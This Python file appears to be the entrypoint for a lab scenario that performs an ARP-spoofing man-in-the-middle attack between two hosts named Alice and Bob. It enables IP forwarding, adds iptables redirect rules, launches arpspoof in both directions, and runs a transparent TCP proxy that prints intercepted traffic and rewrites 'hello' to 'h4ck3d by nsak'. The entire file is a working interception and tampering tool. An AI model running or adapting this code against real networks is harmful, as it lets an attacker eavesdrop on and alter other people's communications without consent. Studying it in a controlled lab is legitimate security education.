"""
scenario entrypoint for mitm.
"""
import socket
import struct
import threading

from scapy.layers.inet import TCP, IP
from scapy.packet import Raw, Packet

import subprocess
from scapy.all import get_if_hwaddr

SO_ORIGINAL_DST = 80  # from linux/netfilter_ipv4.h
PORT = 5000
ALICE_IP = "10.10.10.20"
BOB_IP = "10.10.10.30"
ATTACKER_IP = "10.10.10.10"
LISTEN_IP = "0.0.0.0"
ATTACKER_IFACE = "eth0"
ATTACKER_MAC = get_if_hwaddr(ATTACKER_IFACE)


def set_ip_forwarding(value: bool) -> None:
    """
    Set ip forwarding on the system.

    :param value:
    :return:
    """
    str_value = "1" if value else "0"
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write(str_value)


def setup_iptables() -> None:
    """
    Setup iptables rules for forwarding packets to netfilter queue.

    :return:
    """
    address = f"{ATTACKER_IP}:{PORT}"

    subprocess.run([
        "iptables",
        "-A", "FORWARD",
        "-i", ATTACKER_IFACE,
        "-o", ATTACKER_IFACE,
        "-j", "ACCEPT"
    ], check=True)
    subprocess.run([
        "iptables", "-t", "nat",
        "-A", "PREROUTING",
        "-i", ATTACKER_IFACE,
        "-p", "tcp",
        "!", "-s", ATTACKER_IP,
        "-j", "REDIRECT",
        "--to-ports", str(PORT)
    ], check=True)
    subprocess.run([
        "iptables",
        "-A", "INPUT",
        "-p", "tcp",
        "--dport", str(PORT),
        "-j", "ACCEPT"
    ], check=True)


def arp_spoof(iface: str, target_ip: str, spoof_ip: str) -> None:
    """
    Start arp spoofing on the provided interface.

    :param iface:
    :param target_ip:
    :param spoof_ip:
    :return:
    """
    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, spoof_ip])


def get_original_address(sock: socket.socket) -> tuple[str, int]:
    """


    :param sock:
    :return:
    """
    data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    _, port, raw_ip = struct.unpack("!HH4s8x", data)
    ip = socket.inet_ntoa(raw_ip)
    return ip, port


def forward_tcp_connection(source: socket.socket, destination: socket.socket) -> None:
    """


    :param source:
    :param destination:
    :return:
    """
    print(f"[+] Forwarding connection from {source.getpeername()} to {destination.getpeername()}")

    while True:
        data = source.recv(4096)
        if not data:
            break

        print(data.decode(), flush=True)
        data = data.replace(b"hello", b"h4ck3d by nsak")
        destination.sendall(data)

    source.close()
    destination.close()


def terminate_tcp_connection(client: socket.socket) -> None:
    """

    :return:
    """
    address = get_original_address(client)
    print(f"[+] Terminating connection to {address}")
    server = socket.create_connection(address)

    threading.Thread(target=forward_tcp_connection, args=(client, server)).start()
    threading.Thread(target=forward_tcp_connection, args=(server, client)).start()


def setup_tcp_proxy() -> None:
    """


    :return:
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((LISTEN_IP, PORT))
    sock.listen()

    print("[+] MITM TCP proxy listening")

    while True:
        client, _ = sock.accept()
        terminate_tcp_connection(client)


def run() -> None:
    """
    Scenario, which runs MITM attack, based on arp spoofing.

    :return: None
    """

    set_ip_forwarding(True)
    setup_iptables()
    arp_spoof(ATTACKER_IFACE, ALICE_IP, BOB_IP)
    arp_spoof(ATTACKER_IFACE, BOB_IP, ALICE_IP)
    setup_tcp_proxy()


if __name__ == "__main__":
    run()
